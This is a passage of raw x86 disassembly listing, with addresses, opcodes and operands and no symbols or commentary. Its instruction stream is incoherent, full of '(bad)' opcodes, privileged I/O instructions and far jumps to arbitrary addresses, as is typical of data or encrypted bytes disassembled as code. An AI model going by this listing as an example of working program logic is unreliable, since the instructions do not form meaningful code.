  41473c:	pop    ss
  41473d:	inc    ecx
  41473e:	dec    ebp
  41473f:	adc    eax,0xdbabea8d
  414744:	push   ecx
  414745:	jno    0x414791
  414747:	out    dx,eax
  414748:	inc    ebp
  414749:	push   ebp
  41474a:	pop    edi
  41474b:	sub    esi,DWORD PTR [ebx+0xa]
  41474e:	or     BYTE PTR [ebx-0x783f4279],0xfc
  414755:	add    al,0xa8
  414757:	pop    eax
  414758:	or     al,0x2b
  41475a:	ins    DWORD PTR es:[edi],dx
  41475b:	xchg   edx,eax
  41475c:	jns    0x41474a
  41475e:	ins    BYTE PTR es:[edi],dx
  41475f:	mov    ebp,0x627bacc4
  414764:	lea    ecx,[eax-0x56]
  414767:	cwde   
  414768:	xor    ah,BYTE PTR [ebx]
  41476a:	and    eax,0x38e8a981
  41476f:	mov    ah,0xb0
  414771:	inc    edx
  414772:	push   es
  414773:	push   esi
  414774:	outs   dx,BYTE PTR ds:[esi]
  414775:	fs repz mov dl,0x6
  414779:	inc    ecx
  41477a:	frstor [ebx+0x6e7b142d]
  414780:	add    BYTE PTR [edi+edi*4],0xa7
  414784:	jl     0x4147dc
  414786:	inc    edi
  414787:	les    ecx,FWORD PTR [ebx-0x388f7c23]
  41478d:	push   esp
  41478e:	rcr    BYTE PTR [ecx-0x3c8d214d],cl
  414794:	outs   dx,BYTE PTR ds:[esi]
  414795:	jg     0x414805
  414797:	sub    eax,0x9f66276b
  41479c:	and    eax,0x1df6f01a
  4147a1:	dec    edi
  4147a2:	aaa    
  4147a3:	xor    al,0x4c
  4147a5:	mov    al,0x98
  4147a7:	cmc    
  4147a8:	jp     0x4147ec
  4147aa:	pop    ecx
  4147ab:	addr16 test eax,0xf377e8ec
  4147b1:	pop    ebx
  4147b2:	rcr    BYTE PTR [ecx-0x7e79760],cl
  4147b8:	popf   
  4147b9:	push   esi
  4147ba:	cld    
  4147bb:	mov    eax,ds:0xfa7ff52a
  4147c0:	sbb    edi,DWORD PTR [edx-0x48771f83]
  4147c6:	jmp    0xd7dcc0f4
  4147cb:	stos   DWORD PTR es:[edi],eax
  4147cc:	je     0x414843
  4147ce:	push   esi
  4147cf:	add    eax,0x1929498b
  4147d4:	sbb    eax,0x67eae669
  4147d9:	jp     0x4147a5
  4147db:	stc    
  4147dc:	aam    0x98
  4147de:	cmp    al,0x31
  4147e0:	out    0xe9,al
  4147e2:	and    esp,DWORD PTR [eax+0x1badef48]
  4147e8:	xor    BYTE PTR [esi-0x6b1f5f3f],dh
  4147ee:	(bad)  
  4147ef:	jecxz  0x414812
  4147f1:	mov    ecx,0x73034590
  4147f6:	cmp    dh,BYTE PTR [eax]
  4147f8:	call   0x4a73:0x14db34de
  4147ff:	and    BYTE PTR [ebx+0x4b3b732e],al
  414805:	lods   al,BYTE PTR ds:[esi]
  414806:	shl    DWORD PTR [edx+0x6b],cl
  414809:	xor    BYTE PTR [ecx+0x79],cl
  41480c:	fucompp 
  41480e:	lock ret 
  414810:	rcl    BYTE PTR [esp+edx*1+0x7e6436d6],1
  414817:	jge    0x4147a3
  414819:	dec    eax
  41481a:	je     0x41488b
  41481c:	jnp    0x4147ce
  41481e:	popf   
  41481f:	icebp  
  414820:	or     al,0x3a
  414822:	mov    ebp,DWORD PTR [edx+0x4d8d83a0]
  414828:	add    ah,BYTE PTR [ebp+0x7b]
  41482b:	fdiv   DWORD PTR [ebx-0x29]
  41482e:	sub    BYTE PTR [ebx-0x514056f8],al
  414834:	sub    BYTE PTR [edi-0x46],bl
  414837:	or     DWORD PTR [edx+esi*8],esp
  41483a:	inc    ecx
  41483b:	and    edi,ebx
  41483d:	adc    BYTE PTR [edx],al
  41483f:	sub    DWORD PTR [ebx-0x48abb1f1],esp
  414845:	cdq    
  414846:	or     al,0x77
  414848:	in     eax,dx
  414849:	sub    edi,DWORD PTR [esi+0x56a241f0]
  41484f:	cli    
  414850:	imul   esp,DWORD PTR [eax-0x60f6be55],0x12d6e131
  41485a:	dec    eax
  41485b:	scas   al,BYTE PTR es:[edi]
  41485c:	mov    eax,0x6195266a
  414861:	in     al,dx
  414862:	cmp    al,0xe1
  414864:	in     al,dx
  414865:	add    al,cl
  414867:	mov    esp,0x29ec03ef
  41486c:	sti    
  41486d:	adc    al,0x57
  41486f:	adc    dh,BYTE PTR [edi+ebx*2]
  414872:	xor    DWORD PTR gs:[eax-0x768a6d37],esi
  414879:	ja     0x41481a
  41487b:	fmul   DWORD PTR [esi+0x3901278d]
  414881:	fisttp DWORD PTR [ebx-0x3a]
  414884:	in     al,0x9b
  414886:	and    al,0xe7
  414888:	push   esi
  414889:	lea    edx,[eax+esi*1]
  41488c:	sbb    DWORD PTR [ecx-0x2b062d66],ecx
  414892:	outs   dx,DWORD PTR ds:[esi]
  414893:	xor    ch,BYTE PTR [edx+0x1b84ac23]
  414899:	(bad)  
  41489a:	cdq    
  41489b:	sub    BYTE PTR [ebx],bl
  41489d:	or     dl,BYTE PTR [esi-0x13c54af5]
  4148a3:	mov    DWORD PTR [ecx-0x4386fbc9],ecx
  4148a9:	adc    cl,BYTE PTR [ecx-0x604ef3fe]
  4148af:	adc    eax,DWORD PTR [ebx]
  4148b1:	cmp    BYTE PTR [edx],0x90
  4148b4:	mov    ecx,0x7de0a357
  4148b9:	mov    ecx,esi
  4148bb:	bound  edx,QWORD PTR [ebp+edx*4-0x27]
  4148bf:	adc    DWORD PTR [ebx+0x1],esp
  4148c2:	stc    
  4148c3:	xor    bl,cl
  4148c5:	fisubr WORD PTR [eax+edx*1+0x7d]
  4148c9:	pushf  
  4148ca:	or     DWORD PTR [edx-0x63],edx
  4148cd:	pshuflw xmm5,XMMWORD PTR [eax],0x82
  4148d2:	mov    cl,0xeb
  4148d4:	retf   
  4148d5:	pop    esi
  4148d6:	push   ss
  4148d7:	in     al,0xf9
  4148d9:	jp     0x414893
  4148db:	and    DWORD PTR [edi+0xf3a6885],esi
  4148e1:	push   0x70
  4148e3:	fadd   QWORD PTR [ebx+0xe]
  4148e6:	nop
  4148e7:	push   edi
  4148e8:	xchg   dl,ch
  4148ea:	fnclex 
  4148ec:	push   esi
  4148ed:	clc    
  4148ee:	push   ds
  4148ef:	mul    dl
  4148f1:	push   cs
  4148f2:	adc    bh,al
  4148f4:	mov    BYTE PTR [esi+esi*1],dh
  4148f7:	test   eax,0xff8b09e8
  4148fc:	push   esp
  4148fd:	test   bl,cl
  4148ff:	add    BYTE PTR [edi-0x1bbc9555],0xae
  414906:	jmp    0x414945
  414908:	das    
  414909:	xchg   edi,eax
  41490a:	or     edx,DWORD PTR [ebx+esi*8-0x25c1f47e]
  414911:	inc    edi
  414912:	jne    0x41496e
  414914:	pop    ss
  414915:	or     dh,BYTE PTR [ebx-0x9]
  414918:	push   esp
  414919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41491a:	push   esp
  41491b:	sub    al,0x35
  41491d:	jmp    FWORD PTR [ecx+esi*8+0x2a5f9325]
  414924:	push   edi
  414925:	sbb    DWORD PTR [eax],ebx
  414927:	cwde   
  414928:	sub    DWORD PTR [ebx-0x6a],esp
  41492b:	mov    dh,0x15
  41492d:	in     eax,dx
  41492e:	mov    ah,0xf7
  414930:	cmp    bh,ah
  414932:	je     0x41498a
  414934:	jge    0x414904
  414936:	test   BYTE PTR [eax+0x32],0x5d
  41493a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41493b:	jmp    0x617e9f68
  414940:	sub    ch,BYTE PTR [edi+0x69e5bfac]
  414946:	out    0x1b,al
  414948:	jne    0x414951
  41494a:	pop    eax
  41494b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41494c:	mov    ecx,0xbf7540a8
  414951:	fidiv  WORD PTR [ecx+0x2d]
  414954:	mov    edx,0x97a38e10
  414959:	test   DWORD PTR ds:0x2275af07,edx
  41495f:	and    al,0x31
  414961:	retf   0x1372
  414964:	arpl   WORD PTR [eax+0x3fc2e2d2],si
  41496a:	stos   BYTE PTR es:[edi],al
  41496b:	popf   
  41496c:	mov    eax,0x72862c39
  414971:	and    esp,eax
  414973:	out    dx,eax
  414974:	adc    al,0x29
  414976:	dec    esp
  414977:	test   al,0xb4
  414979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41497a:	rcr    BYTE PTR [ebx+0x2670c6b5],cl
  414980:	pop    edi
  414981:	pop    edi
  414982:	or     edx,edi
  414984:	pop    es
  414985:	jo     0x414934
  414987:	dec    ecx
  414988:	gs enter 0x1060,0x6d
  41498d:	(bad)  
  41498f:	sbb    ah,dl
  414991:	fisttp WORD PTR [eax-0x55351ae2]
  414997:	(bad)  
  414998:	int    0x72
  41499a:	daa    
  41499b:	in     eax,0x90
  41499d:	scas   al,BYTE PTR es:[edi]
  41499e:	clc    
  41499f:	dec    ebx
  4149a0:	mul    bl
  4149a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149a3:	ins    DWORD PTR es:[edi],dx
  4149a4:	add    edx,esp
  4149a6:	sub    eax,DWORD PTR [edi]
  4149a8:	ja     0x4149f3
  4149aa:	sub    DWORD PTR [eax+0x26f559d0],esi
  4149b0:	ds (bad) 
  4149b2:	outs   dx,DWORD PTR ds:[esi]
  4149b3:	adc    DWORD PTR ds:0xf3e4ae8d,ebp
  4149b9:	loope  0x4149ae
  4149bb:	pop    esi
  4149bc:	in     eax,dx
  4149bd:	cmp    BYTE PTR [ebx],dh
  4149bf:	dec    ecx
  4149c0:	ret    
  4149c1:	push   0x42
  4149c3:	jl     0x414982
  4149c5:	xor    DWORD PTR [edi*4-0x2c0fe370],ecx
  4149cc:	enter  0x44e6,0xe
  4149d0:	mov    bh,0xb9
  4149d2:	mov    eax,0x7044e705
  4149d7:	cmp    BYTE PTR [eax-0x39e048d],ch
  4149dd:	es aam 0xf1
  4149e0:	fsubr  DWORD PTR fs:[edx+0x76bf1465]
  4149e7:	jg     0x414a20
  4149e9:	push   ebx
  4149ea:	push   eax
  4149eb:	popa   
  4149ec:	push   esi
  4149ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149ee:	ds icebp 
  4149f0:	mov    dh,0x16
  4149f2:	stos   BYTE PTR es:[edi],al
  4149f3:	aad    0x18
  4149f5:	bound  edi,QWORD PTR [ebx+0x1a7fbc13]
  4149fb:	mov    ds:0x81251690,eax
  414a00:	mov    ebp,0x88c275f
  414a05:	push   edi
  414a06:	add    DWORD PTR [edi+0x53],eax
  414a09:	xchg   edi,eax
  414a0a:	mov    al,0x1d
  414a0c:	je     0x4149e3
  414a0e:	xchg   edx,eax
  414a0f:	sbb    al,0xa1
  414a11:	ja     0x414a55
  414a13:	inc    ebp
  414a14:	in     eax,dx
  414a15:	push   cs
  414a16:	jbe    0x4149ef
  414a18:	jmp    0xfeb3e7f4
  414a1d:	or     BYTE PTR [eax+0x4b],0x41
  414a21:	mov    esi,0x4b06b3c8
  414a26:	fwait
  414a27:	xchg   DWORD PTR [eax+0x79330ff9],esi
  414a2d:	xchg   DWORD PTR [esi+0x6f],edi
  414a30:	ja     0x414aa9
  414a32:	or     eax,0xb98d9e60
  414a37:	test   BYTE PTR [ecx-0x75aa3efb],bl
  414a3d:	fsubp  st(7),st
  414a3f:	sbb    ebx,esp
  414a41:	push   esp
  414a42:	ret    
  414a43:	sar    DWORD PTR [edi+0x14],cl
  414a46:	hlt    
  414a47:	pop    ebx
  414a48:	dec    esp
  414a49:	push   ebp
  414a4a:	(bad)  
  414a4b:	fcmovnu st,st(1)
  414a4d:	xchg   dl,bh
  414a4f:	inc    esp
  414a50:	mov    esp,0x8f758730
  414a55:	push   edi
  414a56:	cmp    bl,BYTE PTR [edi+0xa]
  414a59:	sti    
  414a5a:	arpl   WORD PTR [ebx+0x5a],ax
  414a5d:	mov    ebp,0x580a255
  414a62:	mov    ebp,0x94d5473a
  414a67:	cmp    BYTE PTR [edx],al
  414a69:	dec    ebx
  414a6a:	pop    edx
  414a6b:	shl    DWORD PTR [eax+eiz*4+0x66ec6cdf],cl
  414a72:	fs mov ecx,0x2a46cf91
  414a78:	mov    cl,0xb8
  414a7a:	icebp  
  414a7b:	aam    0x2c
  414a7d:	sar    DWORD PTR ds:[ebx],cl
  414a80:	xchg   ecx,ebx
  414a82:	ins    DWORD PTR es:[edi],dx
  414a83:	rcl    BYTE PTR [ebp+0x50084291],0x6a
  414a8a:	outs   dx,BYTE PTR ds:[esi]
  414a8b:	(bad)  
  414a8c:	adc    bl,BYTE PTR [edx-0x48]
  414a8f:	cmp    DWORD PTR [esi-0x75],edx
  414a92:	and    cl,dl
  414a94:	arpl   WORD PTR [ebx+0x42a14820],si
  414a9a:	mov    dh,0x20
  414a9c:	mov    BYTE PTR [edi+0x2f],ch
  414a9f:	je     0x414b17
  414aa1:	or     BYTE PTR [edi],ah
  414aa3:	shl    dh,1
  414aa5:	jl     0x414ac0
  414aa7:	or     edx,DWORD PTR [eax-0x3d]
  414aaa:	pop    es
  414aab:	aam    0xfa
  414aad:	pop    edi
  414aae:	ins    BYTE PTR es:[edi],dx
  414aaf:	iret   
  414ab0:	dec    ebx
  414ab1:	pop    ds
  414ab2:	adc    esi,DWORD PTR [edi+eax*8+0x62bfb286]
  414ab9:	inc    edi
  414aba:	jnp    0x414af4
  414abc:	arpl   WORD PTR [ecx+0x2b],cx
  414abf:	jae    0x414a53
  414ac1:	jle    0x414a6b
  414ac3:	bound  ebp,QWORD PTR ss:[edx+0x5c9401e3]
  414aca:	mov    ebp,0xdb0c9f1f
  414acf:	lahf   
  414ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ad1:	inc    esp
  414ad2:	mov    ebx,0xc0a86d1a
  414ad7:	jno    0x414ac9
  414ad9:	sub    al,0x3f
  414adb:	stos   BYTE PTR es:[edi],al
  414adc:	loop   0x414b1d
  414ade:	stos   BYTE PTR es:[edi],al
  414adf:	adc    dh,BYTE PTR [ecx+0x50c32edd]
  414ae5:	dec    ecx
  414ae6:	mov    ebp,0xe83ac4cd
  414aeb:	repz xchg esp,eax
  414aed:	test   BYTE PTR [ebp+ecx*4-0x75726b17],ch
  414af4:	inc    ebp
  414af5:	ret    
  414af6:	mov    BYTE PTR [ecx+edi*1],al
  414af9:	imul   esp,DWORD PTR [ebp+0x79855105],0x61
  414b00:	popf   
  414b01:	cmp    BYTE PTR [eax+ebx*8+0x7ce8baab],0xa6
  414b09:	imul   esp,DWORD PTR [ebp+0x6eecb0c],0x7a
  414b10:	test   eax,0xbc5c15a3
  414b15:	call   0xc356:0x8fe19f94
  414b1c:	inc    esp
  414b1d:	xchg   ebp,eax
  414b1e:	sub    BYTE PTR [esi],al
  414b20:	inc    edx
  414b21:	repz cmp eax,0xc35b27e9
  414b27:	popf   
  414b28:	and    edx,ebp
  414b2a:	pop    eax
  414b2b:	sub    esi,esi
  414b2d:	iret   
  414b2e:	mov    ecx,DWORD PTR [ebp+0x12]
  414b31:	ja     0x414b05
  414b33:	mov    gs,WORD PTR [ebp+0x3a]
  414b36:	enter  0xa458,0x2f
  414b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b3b:	inc    ecx
  414b3c:	fisttp WORD PTR [eax+ebx*1-0x14b7e3da]
  414b43:	cld    
  414b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b45:	mov    edi,0xf420c3
  414b4a:	popa   
  414b4b:	and    DWORD PTR [edi-0xf2c0167],0x47e1b9ba
  414b55:	jns    0x414bcd
  414b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b58:	and    BYTE PTR [esi-0x2f179890],dh
  414b5e:	mov    DWORD PTR [ebp+0x27],edx
  414b61:	shl    BYTE PTR [ebx],0x3c
  414b64:	xchg   BYTE PTR [edi-0x665eaf7d],dl
  414b6a:	retf   
  414b6b:	cmp    eax,0x89306e23
  414b70:	in     al,dx
  414b71:	push   esp
  414b72:	jno    0x414b7d
  414b74:	retf   0x137a
  414b77:	ror    DWORD PTR [edi-0x3e],1
  414b7a:	dec    edx
  414b7b:	in     al,dx
  414b7c:	aaa    
  414b7d:	je     0x414bea
  414b7f:	icebp  
  414b80:	xor    ch,BYTE PTR [eax+ebx*4+0x4be8d094]
  414b87:	out    dx,eax
  414b88:	dec    esi
  414b89:	push   0x61
  414b8b:	xor    eax,0x85be5246
  414b90:	pop    edx
  414b91:	jecxz  0x414b42
  414b93:	(bad)  
  414b94:	cmp    eax,0xc41b08ee
  414b99:	shl    DWORD PTR [ebx+eiz*8+0x42],1
  414b9d:	inc    BYTE PTR [ebp+0x7f]
  414ba0:	pushf  
  414ba1:	mov    ecx,0xf9b2d3b0
  414ba6:	mov    esi,0x28d7fbaf
  414bab:	sbb    al,BYTE PTR [edx-0x3fb18e6a]
  414bb1:	test   BYTE PTR [esi+0x31],cl
  414bb4:	(bad)  
  414bb5:	loopne 0x414b76
  414bb7:	neg    BYTE PTR [eax-0x1b9fda1a]
  414bbd:	pop    edi
  414bbe:	neg    DWORD PTR ds:0x134a8fed
  414bc4:	pop    ecx
  414bc5:	sub    dl,BYTE PTR [ecx+0x59]
  414bc8:	dec    esi
  414bc9:	aaa    
  414bca:	and    edx,eax
  414bcc:	stc    
  414bcd:	and    ch,BYTE PTR [ecx+ebx*1]
  414bd0:	xchg   esp,eax
  414bd1:	bound  ebx,QWORD PTR [eax+0x7a4b0455]
  414bd7:	sbb    dl,0x37
  414bda:	jl     0x414b66
  414bdc:	fidiv  DWORD PTR [ebx+0x1217ff59]
  414be2:	fmulp  st(5),st
  414be4:	cs repnz jecxz 0x414bab
  414be8:	sbb    eax,0xa6184d96
  414bed:	fs test eax,0x3afe9df5
  414bf3:	push   0xb09f07d8
  414bf8:	shr    BYTE PTR [eax-0x54],cl
  414bfb:	ret    0xd3f8
  414bfe:	adc    al,BYTE PTR [esi-0x6a]
  414c01:	(bad)  
  414c03:	xlat   BYTE PTR ds:[ebx]
  414c04:	dec    edx
  414c05:	dec    ebx
  414c06:	sub    ebp,DWORD PTR [ebx-0x6d43b7ae]
  414c0c:	push   ds
  414c0d:	pop    ebp
  414c0e:	jl     0x414c04
  414c10:	pusha  
  414c11:	daa    
  414c12:	sti    
  414c13:	xchg   edx,eax
  414c14:	mov    al,ds:0x8a2b00e1
  414c19:	sbb    al,0x93
  414c1b:	mov    ebx,0x69a21301
  414c20:	mov    eax,0xb7130d30
  414c25:	and    dl,BYTE PTR [ecx-0x52]
  414c28:	int    0x24
  414c2a:	stos   BYTE PTR es:[edi],al
  414c2b:	in     eax,dx
  414c2c:	mov    ecx,0xeb6d5461
  414c31:	adc    BYTE PTR [ebx-0x31],bh
  414c34:	push   ds
  414c35:	xor    edx,eax
  414c37:	(bad)  
  414c38:	mov    cl,0x7d
  414c3a:	neg    DWORD PTR [esi-0x9dc41e2]
  414c40:	jno    0x414c1a
  414c42:	jge    0x414c0c
  414c44:	sbb    ah,BYTE PTR [esi]
  414c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c47:	jae    0x414c81
  414c49:	mov    ds:0x8e21b9b5,eax
  414c4e:	ficomp DWORD PTR [esi+0x44]
  414c51:	mov    cl,0x42
  414c53:	cs test eax,0xb8c15e65
  414c59:	push   0xa1575aee
  414c5e:	rol    DWORD PTR [ebx+0x7e9dcec9],0x1b
  414c65:	bound  esp,QWORD PTR [edx+0x66d60de3]
  414c6b:	push   edi
  414c6c:	pop    es
  414c6d:	push   eax
  414c6e:	pushf  
  414c6f:	ja     0x414c1d
  414c71:	pop    esi
  414c72:	xchg   esp,eax
  414c73:	cmp    BYTE PTR [eax],dl
  414c75:	out    dx,al
  414c76:	js     0x414c6d
  414c78:	inc    ebx
  414c79:	xchg   esp,eax
  414c7a:	loop   0x414ce2
  414c7c:	mov    al,0x8f
  414c7e:	push   0x7a
  414c80:	clc    
  414c81:	ret    0xfe79
  414c84:	mov    WORD PTR [ebx-0x4e],es
  414c87:	call   0xad7a:0x2cc5f4f0
  414c8e:	jae    0x414c2b
  414c90:	adc    al,0x89
  414c92:	bound  esi,QWORD PTR [ecx-0x3ec249f4]
  414c98:	jo     0x414c59
  414c9a:	mov    ds:0x4b522646,al
  414c9f:	(bad)  
  414ca0:	test   al,0xc7
  414ca2:	sub    eax,0x18f7f389
  414ca7:	out    dx,al
  414ca8:	dec    ebx
  414ca9:	inc    ebp
  414caa:	mov    ds:0x1fb73aa2,eax
  414caf:	gs xchg ebx,eax
  414cb1:	pop    ebp
  414cb2:	in     eax,dx
  414cb3:	dec    ecx
  414cb4:	pop    es
  414cb5:	or     al,0x78
  414cb7:	jmp    FWORD PTR [esi-0x6a]
  414cba:	xchg   esi,eax
  414cbb:	pop    ss
  414cbc:	pop    ebx
  414cbd:	mov    edx,0x35c5c049
  414cc2:	ja     0x414cd5
  414cc4:	ins    BYTE PTR es:[edi],dx
  414cc5:	retf   0x8c01
  414cc8:	shl    BYTE PTR [ebx],0x86
  414ccb:	scas   al,BYTE PTR es:[edi]
  414ccc:	not    ah
  414cce:	xchg   ecx,eax
  414ccf:	mov    al,ds:0x44f42a09
  414cd4:	mov    bl,0xff
  414cd6:	cmp    eax,DWORD PTR [edx+0x77]
  414cd9:	cmp    DWORD PTR ds:0xb90e1984,ecx
  414cdf:	loopne 0x414d29
  414ce1:	in     eax,dx
  414ce2:	lods   al,BYTE PTR ds:[esi]
  414ce3:	jle    0x414c83
  414ce5:	outs   dx,BYTE PTR ds:[esi]
  414ce6:	jge    0x414ce0
  414ce8:	adc    al,0x7e
  414cea:	les    esp,FWORD PTR [edi+0x72]
  414ced:	das    
  414cee:	pop    edx
  414cef:	aaa    
  414cf0:	mov    eax,0x46fb803b
  414cf5:	mov    BYTE PTR [ebx],bl
  414cf7:	fnstsw WORD PTR [ebp+0x62]
  414cfa:	repnz mov al,ds:0x7ba67702
  414d00:	mov    al,ds:0xa43c2d4f
  414d05:	hlt    
  414d06:	xor    al,BYTE PTR [bp+si-0x673e]
  414d0b:	ror    esi,1
  414d0d:	fisubr DWORD PTR [ebx]
  414d0f:	or     BYTE PTR [ebp-0xb5bdaf],cl
  414d15:	pop    edi
  414d16:	or     al,0xd0
  414d18:	inc    esp
  414d19:	outs   dx,DWORD PTR ds:[esi]
  414d1a:	add    esp,ecx
  414d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d1d:	and    eax,0x47e6715d
  414d22:	adc    DWORD PTR [ecx+ecx*8],esi
  414d25:	mov    ecx,edi
  414d27:	fstp   QWORD PTR [ebx]
  414d29:	jl     0x414cdb
  414d2b:	mov    WORD PTR [ebp+0x17cd1601],es
  414d31:	call   FWORD PTR gs:0xbfec096f
  414d38:	mov    edx,0x575b3cba
  414d3d:	test   DWORD PTR [ebx-0x45114674],edi
  414d43:	clc    
  414d44:	dec    ebx
  414d45:	or     BYTE PTR ds:0x650f5edd,dl
  414d4b:	mov    ds:0xc373a87,al
  414d50:	cmp    dl,dl
  414d52:	inc    edx
  414d54:	sbb    ch,BYTE PTR [eax]
  414d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d57:	jns    0x414db8
  414d59:	pop    ss
  414d5a:	stos   BYTE PTR es:[edi],al
  414d5b:	and    esp,edx
  414d5d:	mov    WORD PTR [edi],cs
  414d5f:	cmp    esi,DWORD PTR [edx-0x62]
  414d62:	clc    
  414d63:	loop   0x414dba
  414d65:	out    dx,al
  414d66:	pop    esi
  414d67:	mov    ds:0x548e71ae,eax
  414d6c:	fcmovu st,st(7)
  414d6e:	imul   ecx,ebx,0xffffffaf
  414d71:	push   es
  414d72:	mov    edi,0xe53e123b
  414d77:	or     BYTE PTR [edx],ah
  414d79:	adc    DWORD PTR [edi+0x7e],0x30
  414d7d:	jmp    0xe0b7:0xfdfc7a6f
  414d84:	xor    DWORD PTR [ebp-0x1df37d85],ecx
  414d8a:	lds    ecx,FWORD PTR [edi]
  414d8c:	bnd ret 
  414d8e:	nop
  414d8f:	iret   
  414d90:	clc    
  414d91:	sbb    eax,0xc193b290
  414d96:	arpl   bx,bp
  414d98:	mov    eax,ds:0x1b136328
  414d9d:	inc    esp
  414d9e:	jle    0x414dbe
  414da0:	test   DWORD PTR [esi],ebp
  414da2:	push   0x8a26426b
  414da7:	popf   
  414da8:	into   
  414da9:	call   0x2d029a98
  414dae:	aas    
  414daf:	lahf   
  414db0:	xlat   BYTE PTR ds:[ebx]
  414db1:	cmp    esp,DWORD PTR [ebp-0x65]
  414db4:	sbb    DWORD PTR cs:[esi+ebp*2-0x11],0xffffffde
  414dba:	fld    QWORD PTR [edi]
  414dbc:	jo     0x414d6e
  414dbe:	mov    ch,BYTE PTR [edx+0x28]
  414dc1:	jb     0x414dc5
  414dc3:	xor    al,0xf2
  414dc5:	or     BYTE PTR [eax],bh
  414dc7:	test   BYTE PTR [ebp+0x47892345],dl
  414dcd:	and    BYTE PTR [edx],dh
  414dcf:	xor    ebp,edx
  414dd1:	fcomp  QWORD PTR [esi]
  414dd3:	js     0x414d5d
  414dd5:	push   edi
  414dd6:	sbb    ebp,DWORD PTR [esi]
  414dd8:	adc    bl,BYTE PTR [edx]
  414dda:	dec    edx
  414ddb:	xchg   edx,eax
  414ddc:	test   al,0x99
  414dde:	and    DWORD PTR [edx+0x263b4c45],0x44
  414de5:	xchg   DWORD PTR [ebx-0x2fe39c7a],esp
  414deb:	mov    BYTE PTR [ebx+0x13],ah
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	mov    eax,ds:0x3403a1e3
  414df4:	icebp  
  414df5:	sub    BYTE PTR [edx],bh
  414df7:	in     al,0x91
  414df9:	aam    0x71
  414dfb:	fs cmp al,al
  414dfe:	xor    dh,bh
  414e00:	inc    ebx
  414e01:	ffree  st(3)
  414e03:	xchg   DWORD PTR [eax+edi*2],ecx
  414e06:	mov    eax,ds:0xf6bc7031
  414e0b:	adc    al,0x73
  414e0d:	and    BYTE PTR [eax-0x63],bl
  414e10:	push   esp
  414e11:	jnp    0x414de1
  414e13:	icebp  
  414e14:	fild   QWORD PTR [ebx+0x4ef9c8f3]
  414e1a:	add    bh,BYTE PTR [eax+0x28]
  414e1d:	(bad)  
  414e1e:	jnp    0x414ddf
  414e20:	xor    cl,BYTE PTR [edx-0x49fa33b7]
  414e26:	iret   
  414e27:	inc    edx
  414e28:	jmp    0x759:0xbfbf9b4a
  414e2f:	or     BYTE PTR [eax],ch
  414e31:	pop    edx
  414e32:	aam    0xd6
  414e34:	push   esi
  414e35:	ds imul edi
  414e38:	js     0x414e2d
  414e3a:	push   eax
  414e3b:	jae    0x414e83
  414e3d:	push   edx
  414e3e:	adc    eax,DWORD PTR [ebx-0xa2c80dc]
  414e44:	std    
  414e45:	xchg   ebx,esp
  414e47:	adc    dl,BYTE PTR [ebx+edi*2-0x2ef00359]
  414e4e:	std    
  414e4f:	sahf   
  414e50:	pop    edx
  414e51:	mov    DWORD PTR [edx],ebp
  414e53:	mov    dh,0xc8
  414e55:	loop   0x414e1f
  414e57:	dec    eax
  414e58:	push   ecx
  414e59:	cmp    esi,DWORD PTR [ebx]
  414e5b:	pusha  
  414e5c:	mov    ch,0x66
  414e5e:	xchg   edi,eax
  414e5f:	push   0x65
  414e61:	icebp  
  414e62:	cmp    al,0xb
  414e64:	xor    DWORD PTR [edi-0x672678c2],0xffffff95
  414e6b:	psrld  mm3,QWORD PTR [edx]
  414e6e:	ret    
  414e6f:	into   
  414e70:	iret   
  414e71:	imul   DWORD PTR [ebx]
  414e73:	jg     0x414dfc
  414e75:	inc    edi
  414e76:	popf   
  414e77:	dec    eax
  414e78:	out    dx,al
  414e79:	and    BYTE PTR [eax],al
  414e7b:	rcr    BYTE PTR [ecx+0x32],cl
  414e7e:	test   DWORD PTR ds:0xe859d08,ebx
  414e84:	xor    dl,BYTE PTR [edx]
  414e86:	cwde   
  414e87:	popa   
  414e88:	cs jnp 0x414efb
  414e8b:	mov    esi,0xed461364
  414e90:	pop    edi
  414e91:	not    ebp
  414e93:	xor    DWORD PTR [edx+0x11],edi
  414e96:	bound  ebx,QWORD PTR [eax+edx*2]
  414e99:	push   0xaf971269
  414e9e:	xor    ch,BYTE PTR [edi]
  414ea0:	stc    
  414ea1:	xor    DWORD PTR [ebp-0x80],edi
  414ea4:	repnz adc BYTE PTR [eax+0x528138d8],bh
  414eab:	cli    
  414eac:	ret    0x3165
  414eaf:	inc    BYTE PTR [ecx+0x70718a9f]
  414eb5:	sbb    eax,0x268e4c17
  414eba:	mov    dl,0x12
  414ebc:	mov    cl,0x2c
  414ebe:	add    BYTE PTR [edi+0x37],dl
  414ec1:	mov    edx,DWORD PTR [ebp+0x6a]
  414ec4:	jle    0x414eec
  414ec6:	scas   al,BYTE PTR es:[edi]
  414ec7:	mov    ch,0x2d
  414ec9:	sub    DWORD PTR [ebp-0x65342fbd],0xffffffe3
  414ed0:	cmp    al,0xb3
  414ed2:	fisub  WORD PTR [eax-0x5c900fb3]
  414ed8:	sahf   
  414ed9:	push   esi
  414eda:	test   dl,0x30
  414edd:	sbb    DWORD PTR [edx+0x3d9ffd9c],eax
  414ee3:	mov    ds,WORD PTR [bp-0x75]
  414ee7:	cmp    BYTE PTR [ecx-0x5],ah
  414eea:	sub    al,0x21
  414eec:	mov    ah,0x5f
  414eee:	scas   eax,DWORD PTR es:[edi]
  414eef:	sub    esi,ecx
  414ef1:	loopne 0x414ea8
  414ef3:	add    BYTE PTR [ecx],ah
  414ef5:	mov    ecx,0x2b8b1786
  414efa:	xchg   esi,eax
  414efb:	mov    ebp,0xe1bded9d
  414f00:	inc    ebp
  414f01:	jnp    0x414f46
  414f03:	adc    BYTE PTR [ebp+0x5de5e53d],bl
  414f09:	das    
  414f0a:	loop   0x414f78
